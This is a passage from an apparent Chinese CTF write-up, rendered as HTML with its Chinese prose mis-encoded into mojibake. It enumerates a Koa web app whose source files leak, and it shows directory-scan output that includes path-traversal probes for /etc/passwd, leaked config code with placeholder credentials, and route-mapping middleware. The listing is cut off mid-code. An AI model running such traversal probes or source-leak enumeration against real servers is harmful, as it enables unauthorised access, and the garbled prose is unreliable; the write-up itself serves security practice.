/\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[23:24:00] 200 -  679B  - /app.js</span><br><span class="line">[23:24:01] 403 -    9B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">[23:24:02] 200 -  439B  - /config.js</span><br><span class="line">[23:24:03] 200 -  170B  - /Dockerfile</span><br><span class="line">[23:24:07] 200 -  627B  - /package.json</span><br><span class="line">[23:24:07] 200 -   29KB - /package-lock.json</span><br><span class="line">[23:24:08] 200 -    9B  - /Readme.md</span><br><span class="line">[23:24:08] 200 -    9B  - /README.md</span><br><span class="line">[23:24:08] 200 -    9B  - /README.MD</span><br><span class="line">[23:24:08] 200 -    9B  - /ReadMe.md</span><br><span class="line">[23:24:08] 200 -    9B  - /readme.md</span><br><span class="line">[23:24:12] 200 -    6KB - /views</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><h3 id="å…¥å£ç‚¹å‘ç°"><a href="#å…¥å£ç‚¹å‘ç°" class="headerlink" title="å…¥å£ç‚¹å‘ç°"></a>å…¥å£ç‚¹å‘ç°</h3><p>å‘ç°å­˜åœ¨ç›¸å…³çš„ js web æ–‡ä»¶ å°è¯•æŸ¥çœ‹æ˜¯å¦æœ‰å…¶ä»–æ³„æ¼ã€‚</p><ul><li><p>app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span>        = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyparser = <span class="built_in">require</span>(<span class="string">&#x27;koa-bodyparser&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span>     = <span class="built_in">require</span>(<span class="string">&#x27;koa-static&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> cors       = <span class="built_in">require</span>(<span class="string">&#x27;./cors&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> template   = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/template&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> route      = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/route&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> api        = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/api&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> listen     = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/listen&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> production = process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app        = <span class="keyword">new</span> <span class="title class_">Koa</span>()</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">static</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">template</span>(<span class="string">&#x27;views&#x27;</span>, &#123;</span><br><span class="line">        <span class="comment">// noCache: !production,</span></span><br><span class="line">        <span class="comment">// watch  : !production</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyparser)</span><br><span class="line">    .<span class="title function_">use</span>(cors)</span><br><span class="line">    .<span class="title function_">use</span>(route)</span><br><span class="line">    .<span class="title function_">use</span>(api)</span><br><span class="line"></span><br><span class="line"><span class="title function_">listen</span>(app)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>package.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;updater&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt; v0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;app.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;axios&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.21.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.13.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-bodyparser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.3.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-router&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^9.1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-sslify&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.0.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-static&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa2-cors&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0.6&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;nunjucks&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.2.2&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pm2 start ecosystem.config.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;prod&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pm2 start ecosystem.config.js --env production&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Readme</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># updater</span><br></pre></td></tr></table></figure></li><li><p>config.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = &#123;</span><br><span class="line">    <span class="attr">server</span>: &#123;</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;test.example.com&#x27;</span>,</span><br><span class="line">        <span class="attr">pact</span>: <span class="string">&#x27;https&#x27;</span>,</span><br><span class="line">        <span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="string">&#x27;443&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">coding</span>: &#123;</span><br><span class="line">        <span class="attr">username</span>: <span class="string">&#x27;test@test.com&#x27;</span>,</span><br><span class="line">        <span class="attr">password</span>: <span class="string">&#x27;IAmTheCodeMaster&#x27;</span>,</span><br><span class="line">        <span class="attr">apiKey</span>: <span class="string">&#x27;flag&#123;This is fake flag&#125;:-)&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;development&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable constant_">CONFIG</span>.<span class="property">server</span>.<span class="property">pact</span> = <span class="string">&#x27;http&#x27;</span>,</span><br><span class="line">    <span class="variable constant_">CONFIG</span>.<span class="property">server</span>.<span class="property">port</span> = <span class="string">&#x27;80&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="variable constant_">CONFIG</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæåˆ°äº† coding è¿˜æœ‰ç”¨æˆ·åå¯†ç  ï¼ˆå‡çš„ï¼‰å¹¶ä¸çŸ¥é“ coding æ˜¯ä»€ä¹ˆçš„æƒ…å†µä¸‹ã€‚ ç½‘ç«™ä¹Ÿæ²¡æœ‰ç™»é™†å£ã€‚</p></li><li><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">16</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install &amp;&amp; npm install -g pm2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">443</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;pm2-runtime&quot;</span>, <span class="string">&quot;/app/ecosystem.config.js&quot;</span>, <span class="string">&quot;--env&quot;</span>, <span class="string">&quot;production&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>è¿™é‡Œæ‰€æœ‰çš„è¯æ®éƒ½è¯´æ˜äº† è¿™ä¸ªç½‘ç«™æ³„æ¼äº†æºä»£ç  ä¹Ÿå°±æ˜¯ js æ–‡ä»¶ </p><p>æ¥ä¸‹æ¥æµ‹è¯•æ˜¯å¦å­˜åœ¨ ecosystem.config.js æ–‡ä»¶ æ¥éªŒè¯è¿™ä¸ªç»“è®º</p><p>æˆ‘ä»¬å¯ä»¥è¯•è¯• <a href="https://127.0.0.1/ecosystem.config.js">https://127.0.0.1/ecosystem.config.js</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Options reference: https://pm2.keymetrics.io/docs/usage/application-declaration/</span></span><br><span class="line">const package = require(&#x27;./package.json&#x27;)</span><br><span class="line"></span><br><span class="line">module.exports = <span class="punctuation">&#123;</span></span><br><span class="line">    apps<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        name               <span class="punctuation">:</span> package.name<span class="punctuation">,</span></span><br><span class="line">        script             <span class="punctuation">:</span> &#x27;app.js&#x27;<span class="punctuation">,</span></span><br><span class="line">        args               <span class="punctuation">:</span> &#x27;one two&#x27;<span class="punctuation">,</span></span><br><span class="line">        instances          <span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        autorestart        <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        watch              <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        ignore_watch       <span class="punctuation">:</span> <span class="punctuation">[</span>&#x27;node_modules&#x27;<span class="punctuation">,</span> &#x27;logs&#x27;<span class="punctuation">,</span> &#x27;.git&#x27;<span class="punctuation">,</span> &#x27;statics&#x27;<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        error_file         <span class="punctuation">:</span> &#x27;logs/err.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        out_file           <span class="punctuation">:</span> &#x27;logs/out.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        log_file           <span class="punctuation">:</span> &#x27;logs/all.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        log_date_format    <span class="punctuation">:</span> &#x27;YYYY-MM-DD HH<span class="punctuation">:</span>mm<span class="punctuation">:</span>ss&#x27;<span class="punctuation">,</span></span><br><span class="line">        max_memory_restart <span class="punctuation">:</span> &#x27;<span class="number">1</span>G&#x27;<span class="punctuation">,</span></span><br><span class="line">        env<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            NODE_ENV       <span class="punctuation">:</span> &#x27;development&#x27;<span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        env_production<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            NODE_ENV       <span class="punctuation">:</span> &#x27;production&#x27;<span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    deploy<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        production<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="comment">// host          : CONFIG.remote.host,</span></span><br><span class="line">            <span class="comment">// user          : CONFIG.remote.user,</span></span><br><span class="line">            <span class="comment">// path          : CONFIG.remote.path,</span></span><br><span class="line">            <span class="comment">// repo          : CONFIG.git.ssh,</span></span><br><span class="line">            <span class="comment">// ref           : CONFIG.git.ref,</span></span><br><span class="line">            &#x27;post-deploy&#x27; <span class="punctuation">:</span> &#x27;npm install &amp;&amp; pm2 reload ecosystem.config.js --env production&#x27;</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾æ˜¯å­˜åœ¨ js ä»£ç æ³„æ¼çš„</p><h3 id="æ£€æŸ¥-middleware"><a href="#æ£€æŸ¥-middleware" class="headerlink" title="æ£€æŸ¥ middleware"></a>æ£€æŸ¥ middleware</h3><p>é€šè¿‡ app.js æ–‡ä»¶</p><p>å¯ä»¥ç¿»æ‰¾åˆ° å¦‚ä¸‹çš„åº“ä¸ä¸­é—´ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const template   = require(&#x27;./middlewares/template&#x27;)</span><br><span class="line">const route      = require(&#x27;./middlewares/route&#x27;)</span><br><span class="line">const api        = require(&#x27;./middlewares/api&#x27;)</span><br><span class="line">const listen     = require(&#x27;./middlewares/listen&#x27;)</span><br></pre></td></tr></table></figure><p>api listen route template å››ä¸ªåˆ†åˆ«é€šè¿‡ä¾èµ–æ³¨å…¥çš„æ–¹å¼å¼•å…¥</p><p>è¿™é‡Œç›´æ¥å»çœ‹ api </p><p>å¯¹äº api åˆ†åˆ«å°è¯•è¿™ä¸‰ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1/middlewares/api.js</span><br><span class="line">https://127.0.0.1/middlewares/api</span><br><span class="line">https://127.0.0.1/middlewares/api/index.js</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç° index.js æœ‰è¿”å›</p><p>å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs       = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path     = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router   = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> tools    = <span class="built_in">require</span>(<span class="string">&#x27;../../utils&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Response</span> = <span class="built_in">require</span>(<span class="string">&#x27;../response&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// apiPath ä¸º å½“å‰ç›®å½•çš„ä¸Šä¸Šçº§ ä¹Ÿå°±æ˜¯ / ä¸‹ æ˜¯å¯ä»¥è®¿é—®çš„</span></span><br><span class="line"><span class="keyword">const</span> apiPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../../api&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™é‡Œæ˜¯ç½‘ç«™è‡ªå·±å®ç°çš„ CGI </span></span><br><span class="line"><span class="comment">// åŠ¨æ€çš„åœ¨ api æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰çš„ js æ–‡ä»¶æ³¨å†Œè¿›æ¥ å¹¶ä¸”èµ‹äºˆå¯¹åº”çš„ path</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">registeApi</span> (dir) &#123;</span><br><span class="line">    <span class="comment">// éå†ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">    fs.<span class="title function_">readdirSync</span>(dir).<span class="title function_">forEach</span>(<span class="function"><span class="params">fileName</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// æ–‡ä»¶å®Œæ•´è·¯å¾„</span></span><br><span class="line">        <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(dir, fileName)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è‹¥è¯¥æ–‡ä»¶ä¸ºç›®å½•ï¼Œåˆ™ç»§ç»­éå†è¯¥ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> (fs.<span class="title function_">statSync</span>(filePath).<span class="title function_">isDirectory</span>()) <span class="keyword">return</span> <span class="title function_">registeApi</span>(filePath)</span><br><span class="line">        <span class="comment">// å¿½ç•¥å…¥å£æ–‡ä»¶</span></span><br><span class="line">        <span class="comment">// if (filePath.endsWith(&#x27;index.js&#x27;))       return</span></span><br><span class="line">        <span class="comment">// å¿½ç•¥é js æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> (!filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.js&#x27;</span>))           <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;é JS æ–‡ä»¶ä¸è¦æ”¾åœ¨ api ç›®å½•ä¸‹&#x27;</span> + filePath)</span><br><span class="line"></span><br><span class="line">        <span class="title function_">regist</span>(filePath);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨å†Œå•ä¸ª api </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">regist</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="comment">// API</span></span><br><span class="line">    <span class="comment">// é€šè¿‡ filePath å¼•å…¥</span></span><br><span class="line">    <span class="keyword">const</span> api     = <span class="built_in">require</span>(filePath)</span><br><span class="line">    <span class="comment">// API åç§°</span></span><br><span class="line">    <span class="keyword">const</span> apiName = <span class="title function_">getApiName</span>(filePath)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†è¯·æ±‚æ–¹å¼</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> type <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">keys</span>(api)) &#123;</span><br><span class="line">        <span class="comment">// å“åº”æ“ä½œ å†™å…¥ router </span></span><br><span class="line">        router[type](apiName, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">            <span class="keyword">await</span> api[type](<span class="title function_">getRequest</span>(ctx), <span class="keyword">new</span> <span class="title class_">Response</span>(ctx))</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// æ‰“å°æ¥å£ä¿¡æ¯</span></span><br><span class="line">        <span class="title function_">apiLog</span>(type, apiName)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å»æ‰ .js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getApiName</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> filePath.<span class="title function_">cutEnd</span>(<span class="number">3</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(apiPath, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getRequest</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        params : &#123; ...ctx.<span class="property">request</span>.<span class="property">body</span>, ...tools.<span class="title function_">getUrlParams</span>(ctx.<span class="property">request</span>.<span class="property">url</span>) &#125;,</span><br><span class="line">        page   : tools.<span class="title function_">getPagination</span>(ctx),</span><br><span class="line">        ctx,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">apiLog</span> (type, apiName, apiIntro = <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`<span class="subst">$&#123;apiIntro&#125;</span>\n[<span class="subst">$&#123;type.toUpperCase()&#125;</span>]: <span class="subst">$&#123;apiName&#125;</span>\n****************************************`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// require æ—¶æ³¨å†Œ APIPATH</span></span><br><span class="line"><span class="title function_">registeApi</span>(apiPath)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = (<span class="function">() =&gt;</span> router.<span class="title function_">routes</span>())()</span><br></pre></td></tr></table></figure><h3 id="æ•´ç†é€»è¾‘-å‘ç°ç«¯å€ª"><a href="#æ•´ç†é€»è¾‘-å‘ç°ç«¯å€ª" class="headerlink" title="æ•´ç†é€»è¾‘ å‘ç°ç«¯å€ª"></a>æ•´ç†é€»è¾‘ å‘ç°ç«¯å€ª</h3><p>åœ¨ /api/XXX ä¸‹çš„ ä»»ä½• /api/path/to/api.js éƒ½ä¼šè¢«æ³¨å†Œæˆ /path/to/api </p><p>é‚£ä¹ˆ æŸ¥çœ‹ / ä¸‹çš„æ‰€æœ‰è¯·æ±‚å‡ºå»çš„ api ä½ å¯ä»¥ç›´æ¥ grep æ‹¿åˆ°å¦‚ä¸‹çš„æ•°æ®</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://fastly.jsdelivr.net/npm/axios@0.21.1/dist/axios.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/projectList&#x27;</span>)</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/versionList&#x27;</span>, &#123;</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/distList&#x27;</span>, &#123;</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/distExist&#x27;</span>, &#123;</span><br></pre></td></tr></table></figure><p>ä¸€å…± 4 ä¸ª api </p><blockquote><p>æ— è®ºæ˜¯å“ªä¸ª api ä½ éƒ½å¯ä»¥è¿›è¡Œè·Ÿè¸ª</p></blockquote><p>ä¾‹å¦‚ç¬¬äºŒä¸ª api <code>/v2/coding/versionList</code> æ‰€åœ¨çš„ä½ç½®æ ¹æ®ä¸Šé¢ middleware/api çš„æ¨æ–­</p><p>å¯ä»¥å‘ç°æ”¾åœ¨äº†å¦‚ä¸‹çš„ä½ç½®</p><blockquote><p>å–œæ¬¢å†™æ³¨é‡ŠçœŸæ˜¯å¥½ç¨‹åºå‘˜ (ç¡®ä¿¡)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/v2/coding/versionList.js</span><br></pre></td></tr></table></figure><p>è®¿é—®åæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„ js æ–‡ä»¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 